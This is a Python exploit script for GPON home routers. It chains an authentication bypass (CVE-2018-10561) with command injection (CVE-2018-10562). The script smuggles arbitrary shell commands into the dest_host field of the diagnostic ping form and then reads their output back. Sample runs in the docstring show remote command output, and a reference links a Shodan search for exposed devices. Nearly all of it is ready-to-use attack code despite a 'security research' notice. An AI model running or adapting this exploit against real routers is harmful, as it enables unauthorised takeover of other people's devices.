#!/usr/bin/env python
# -*- coding: utf-8 -*-

# CVE-2018-10561
# Author: Nixawk
# Notice: Just for security research purpose

"""
$ py3 exploit-CVE-2018-10562.py http://192.168.1.100:8080/ "uname -a"
INFO:__main__:sending payload: 127.0.0.1;`echo zMEw;uname -a;echo zMEw`;
diag_result = "ping -c 4 -s 64 127.0.0.1;zMEw
Linux (none) 2.6.21.7-cig-70 #46 Wed Aug 20 15:39:38 CST 2014 mips unknown
zMEw;

";
INFO:__main__:Vulnerable: http://192.168.1.100:8080/

$ py3 exploit-CVE-2018-10562.py http://192.168.1.100:8080/ "ls /bin/"
INFO:__main__:sending payload: 127.0.0.1;`echo DbEG;ls /bin/;echo DbEG`;
diag_result = "ping -c 4 -s 64 127.0.0.1;DbEG
Console
EthMgr
GponCLI
GponSLID
LogMgr
MecMgr
MiscMgr
NetMgr
PonMgr
Ssp
TimerMgr
VmrMgr
WebMgr
ash
brctl
busybox
cat
catv
chgrp
chmod
chown
conntrack
cp
date
dd
df
dmesg
dnsmasq
dropbear
dsp
echo
egrep
false
fgrep
grep
gunzip
gzip
hostname
ip
ipaddr
iplink
iproute
iprule
iptables
iptables-restore
iptables-save
iptables-xml
iptunnel
kill
ln
ls
lsof
lspci
mReport
mkdir
mknod
mktemp
mount
mountpoint
mv
netstat
nice
ntpclient
pidof
ping
printenv
ps
pure-ftpd
pwd
rm
rmdir
sed
sh
sleep
stat
stty
sync
tar
tc
telnetd
touch
tr069Mgr
true
ttcp
umount
uname
usleep
vi
zcat
DbEG;

";
INFO:__main__:Vulnerable: http://192.168.1.100:8080/
"""

import requests
import string
import random
import logging
import time


logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)


def random_str(length):
    """Generate a random string.
    """
    cset = string.ascii_letters
    chars = [list(cset)[random.randrange(len(cset))] for i in range(length)]
    return "".join(chars)


def send_rce_payload(url, payload):
    """Send payload to vulnerable target.
    """
    response = None

    try:
        postdata = {
            'XWebPageName': 'diag',
            'diag_action': 'ping',
            'wan_conlist': 0,
            'dest_host': payload,
            'ipv': 0
        }

        response = requests.post(url, data=postdata)
    except Exception as err:
        log.exception(err)

    return response


def recv_rce_response(url):
    """Receive rce response.
    """
    response = None

    try:
        response = requests.get(url)
    except Exception as err:
        log.exception(err)

    return response


def parse_rce_output(response):
    """parse rce output.
    """
    output = ""
    if response:
        for line in response.text.splitlines():
            if 'diag_result = "ping -c 4 -s 64' in line:
                output = line.replace('\\n', '\n')
                break
                # print(output)

    return output


def exploit(url, cmd, wait_time=2):
    """
    The researchers have found a way to bypass the authentication to access
    the GPON home routers (CVE-2018-10561). The experts chained this
    authentication bypass flaw with another command injection vulnerability
    (CVE-2018-10562) and were able to execute commands on the device.
    """

    randflag = random_str(4)  # generate a random flag  

    # payload_url = requests.compat.urljoin(url, '/?images/')
    payload_url = requests.compat.urljoin(url, '/GponForm/diag_Form?images/')
    cmdrslt_url = requests.compat.urljoin(url, '/diag.html?images/')

    # Send rce payload to GPON HOME Router
    payload = "127.0.0.1;`echo {randflag};{cmd};echo {randflag}`;".format(
        randflag=randflag, cmd=cmd
    )

    # payload = "127.0.0.1;`echo AAAA;ls /bin/;echo AAAA`;"

    log.info("sending payload: {payload}".format(payload=payload))

    resp1 = send_rce_payload(payload_url, payload)
    if not resp1:
        return False

    pwn_condtions = all([
        resp1.status_code == 200,
        "<title>GPON Home Gateway</title>" in resp1.text
    ])

    # Check if pwn response is available.
    if not pwn_condtions:
        return False

    # Recv rce response
    # If time is not suitable, False Positive may appear here.

    log.debug("waiting {wait_time}/s...".format(wait_time=wait_time))
    time.sleep(wait_time)  # wait_time associated with vulnerable status

    resp2 = recv_rce_response(cmdrslt_url)
    if not resp2:
        return False

    # Wait to flush result,  so False Positive.

    # diag_host = 'var diag_host = "{payload}";'.format(payload=payload)
    # diag_host = 'var diag_host = "127.0.0.1;`echo'
    diag_result = 'diag_result = "ping -c 4 -s 64'

    rce_condtions = all([
        resp2.status_code == 200,
        diag_result in resp2.text,
        # diag_host in resp2.text
    ])

    # response
    # {'diag_result = "ping -c 4 -s 64 127.0.0.1;AAAA\\nuid=0(root) gid=0(root)\\nAAAA;\\n\\n";'}

    output = parse_rce_output(resp2)
    if output:
        log.info("reading result : {output}".format(output=output))

    return rce_condtions


if __name__ == '__main__':
    import sys

    if len(sys.argv) != 3:
        print("Usage : python %s http://target.com/ <os-cmd>" % sys.argv[0])
        sys.exit(0)

    url = sys.argv[1]
    cmd = sys.argv[2]

    status = exploit(url, cmd)
    if status:
        log.info("Vulnerable: {url}".format(url=url))
    else:
        log.info("Unknown: {url}".format(url=url))


## References

# https://nvd.nist.gov/vuln/detail/CVE-2018-10562
# https://www.exploit-db.com/exploits/44576/
# https://www.vpnmentor.com/blog/critical-vulnerability-gpon-router/
# https://securityaffairs.co/wordpress/71987/hacking/gpon-home-routers-hack.html
# https://www.shodan.io/search?query=title%3A%22GPON+Home+Gateway%22
# https://paper.seebug.org/593/
# https://github.com/nixawk/labs
